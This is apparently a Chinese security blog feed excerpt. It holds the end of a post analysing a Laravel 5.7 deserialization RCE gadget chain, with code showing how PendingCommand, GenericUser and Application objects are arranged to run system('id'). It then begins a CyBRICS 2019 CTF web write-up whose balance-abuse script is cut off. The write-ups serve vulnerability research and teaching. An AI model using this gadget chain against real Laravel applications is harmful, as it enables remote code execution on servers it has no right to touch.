O%3A3%3A%22sky%22%3A1%3A%7Bs%3A3%3A%22sky%22%3Bs%3A4%3A%22test%22%3B%7D</span></span><br></pre></td></tr></table></figure></p><p>我们传入laravel，并进行反序列化，可以看到load方法试图加载我们随便输入的sky类，首先在$facadeNamespace中寻找指定类名：<br><img src="/images/2019-07-18-16-14-05.png" alt=""><br><img src="/images/2019-07-18-16-14-16.png" alt=""><br>如果找到，则会通过loadFacade进行加载，否则则进入loadClass进行class map查找，在vendor目录下寻找所需类：<br><img src="/images/2019-07-18-16-04-45.png" alt=""><br><img src="/images/2019-07-18-16-18-25.png" alt=""><br>但是并不能找到sky类，最后会return false。<br>最后查看是否class名以Swift_开头：<br><img src="/images/2019-07-18-16-06-04.png" alt=""><br>最后因为找不到对应类的定义，所以并不能成功进入反序列化流程。<br>但如果我们用一个存在的类，可以明显发现在findFile函数的classMap中找到了相关类，并返回进行了include：<br><img src="/images/2019-07-18-16-35-36.png" alt=""><br><img src="/images/2019-07-18-16-36-22.png" alt=""></p><h2 id="危险类挖掘"><a href="#危险类挖掘" class="headerlink" title="危险类挖掘"></a>危险类挖掘</h2><p>挖掘一个框架的新漏洞，从框架新加入的代码入手是一个很好的思路。我们注意到laravel在5.7之后加入了PendingCommand:<br><img src="/images/2019-07-18-16-44-20.png" alt=""><br>值得注意的是，我们查到该文件，其定义了PendingCommand类，同时注意到其两个方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非常有意思的是，该类有魔法方法__destruct，而该魔法方法会调用run函数，而run函数可以进行执行命令。<br>我们查看其构造方式:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>一共需要用到4个属性，我们查阅对应手册：<br><img src="/images/2019-07-18-19-03-19.png" alt=""></p><h2 id="run-amp-mockConsoleOutput"><a href="#run-amp-mockConsoleOutput" class="headerlink" title="run &amp; mockConsoleOutput"></a>run &amp; mockConsoleOutput</h2><p>我们跟进run方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>关注到第一个关键点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br></pre></td></tr></table></figure></p><p>我们跟进该函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">                &#125;))</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $mock;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先是第一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure></p><p>我们跟进createABufferedOutputMock:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">                -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">                -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with($output, Mockery::any())</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里如果想继续走下去，我们需要属性$this-&gt;test-&gt;expectedOutput<br><img src="/images/2019-07-18-17-12-55.png" alt=""><br>那么有没有类有expectedOutput呢？我们全局搜索，发现在Illuminate\Foundation\Testing\Concerns中存在这样的属性。<br>但这样的类很难被实例化，无法走通后面的路。但此时我们可以巧用魔法方法<strong>get：当我们试图获取一个不可达属性，类会自动调用</strong>get函数。<br>我们找到如下类：<br>vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php<br><img src="/images/2019-07-18-17-13-51.png" alt=""><br>可以使用我们经常使用的小trick，设置键名为expectedOutput的数组，即可利用。<br>然后是第二步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question)</span><br></pre></td></tr></table></figure></p><p>此处依旧可以使用__get方法，定义键名为expectedQuestions的数组即可。</p><h2 id="run-amp-实例化对象"><a href="#run-amp-实例化对象" class="headerlink" title="run &amp; 实例化对象"></a>run &amp; 实例化对象</h2><p>到此为止，我们已经能构造出PendingCommand前3个参数的值了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">                <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">         )</span><br><span class="line">);</span><br><span class="line">$command = <span class="string">"system"</span>;</span><br><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure></p><p>那么最后一个参数$app同样尤为关键，我们继续跟进run的代码，来到关键第三步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure></p><p>我们跟入这一句，可以发现，首先代码在实例化对象：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app[Kernel::class]</span><br></pre></td></tr></table></figure></p><p>然后再去调对应的call方法，那么跟入不难发现，其想要实例化的对象是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure></p><p>首先进入：<br><img src="/images/2019-07-18-19-16-16.png" alt=""><br>跟进make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进其父类的make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>跟进resolve：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>那么此时发现$concrete的值来自于getConcrete($abstract):<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>跟进getConcrete：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If we don't have a registered resolver or concrete for the type, we'll just</span></span><br><span class="line">        <span class="comment">// assume each type is a concrete name and will attempt to resolve it as is</span></span><br><span class="line">        <span class="comment">// since the container should be able to resolve concretes automatically.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $abstract;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到，如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’]。<br>而bindings是类Container的属性，同时注意到类Container中也有可以RCE的call方法。那么现在思路很清晰：我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE。<br>而这样的类选择类Container的子类：Illuminate\Foundation\Application再好不过。<br>而$abstract的值为Illuminate\Contracts\Console\Kernel。<br>那么此时我们容易知道$bindings只要存在键名为Illuminate\Contracts\Console\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>就可以保证返回值为Illuminate\Foundation\Application。<br>接下来会判断是否可以build：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进isBuildable：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果$concrete和$abstract相等则可以build。<br>但我们现在明显：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="string">'Illuminate\Foundation\Application'</span>;</span><br><span class="line">$abstract = <span class="string">'Illuminate\Contracts\Console\Kernel'</span>;</span><br></pre></td></tr></table></figure></p><p>所以会进入else分支，继续make。<br>而make时，我们注意到：<br><img src="/images/2019-07-18-22-35-43.png" alt=""><br>而else分支传入make的值为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br></pre></td></tr></table></figure></p><p>这样一来直接就构成了后面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>这次bindings数组里并没有键名为Illuminate\Foundation\Application的数组里，于是直接回返回$abstract的值，这样一来就达到了实例化Illuminate\Foundation\Application的目的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = $abstract = <span class="string">'Illuminate\Foundation\Application'</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-18-21-54-57.png" alt=""><br>最后则可以让最后的$this-&gt;app[Kernel::class]的值变为Illuminate\Foundation\Application。为了更加直观，我们在这个位置做如下改写：<br><img src="/images/2019-07-18-21-58-57.png" alt=""><br><img src="/images/2019-07-18-22-00-19.png" alt=""><br>紧接着会调用Illuminate\Foundation\Application父类Illuminate\Container\Container的call方法：<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><img src="/images/2019-07-18-18-33-58.png" alt=""><br><img src="/images/2019-07-18-22-03-01.png" alt=""><br>最后走入这个call_user_func_array，而$callback是我们可以控制的system，而getMethodDependencies()，我们跟进：<br><img src="/images/2019-07-18-22-04-15.png" alt=""><br>最后会返回我们需要的参数id，那么这样一来，即可RCE成功：<br><img src="/images/2019-07-18-22-04-56.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>laravel整个反序列化RCE链用的非常漂亮：<br>1.类PendingCommand 利用 <strong>destruct触发run()方法<br>2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组<br>3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 </strong>get()魔法方法满足mockConsoleOutput<br>4.利用任意实例化对象，实例化Illuminate\Foundation\Application<br>5.调用call触发父类call方法RCE</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;laravel序列化&quot;&gt;&lt;a href=&quot;#laravel序列化&quot; class=&quot;headerlink&quot; title=&quot;laravel序列化&quot;&gt;&lt;/a&gt;laravel序列化&lt;/h2&gt;&lt;p&gt;Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Fr
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF Quals 2019 Web Writeup</title>
    <link href="http://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/"/>
    <id>http://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/</id>
    <published>2019-07-22T02:11:10.000Z</published>
    <updated>2019-08-02T08:20:23.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末参加了LCBC主办的2019 CyBRICS CTF Quals，在金砖五国中，获得了top5的成绩，以下是web的题解。</p><h2 id="Bitkoff-Bank"><a href="#Bitkoff-Bank" class="headerlink" title="Bitkoff Bank"></a>Bitkoff Bank</h2><p><img src="/images/2019-07-22-10-37-35.png" alt=""><br>点一次mine btc，获得0.0000000001 BTC，而购买auto-miner需要0.1 USD。<br>购买auto-miner后，我们的网页会多出这样一个script，每秒帮我们点击1000次，但实际上并非1秒能获得这么多BTC：<br><img src="/images/2019-07-22-10-37-12.png" alt=""><br>然后获取flag需要1USD，显然即便依靠auto-miner也是遥遥无期的。<br>通过做题的经验，给了的功能一般不会白给，我们测试一下转换功能，发现不断将BTC转成USD，将USD转成BTC，就会因为汇率问题就会不断加钱，写脚本即可：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://95.179.148.72:8083/index.php'</span></span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'yyplsky'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'yyplskycool'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetUSD</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">res = r.content</span><br><span class="line">res = re.findall(<span class="string">r'&lt;b&gt;([0-9\.]*)&lt;/b&gt;&lt;br&gt;'</span>,res)</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">USD_to_BTC</span><span class="params">(USD)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'from_currency'</span>:<span class="string">'usd'</span>,</span><br><span class="line"><span class="string">'to_currency'</span>:<span class="string">'btc'</span>,</span><br><span class="line"><span class="string">'amount'</span>:USD</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetBTC</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">res = r.content</span><br><span class="line">res = re.findall(<span class="string">r'&lt;b&gt;([0-9\.]*)&lt;/b&gt;&lt;br&gt;'</span>,res)</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BTC_to_USD</span><span class="params">(BTC)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'from_currency'</span>:<span class="string">'btc'</span>,</span><br><span class="line"><span class="string">'to_currency'</span>:<span class="string">'usd'</span>,</span><br><span class="line"><span class="string">'amount'</span>:BTC</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = 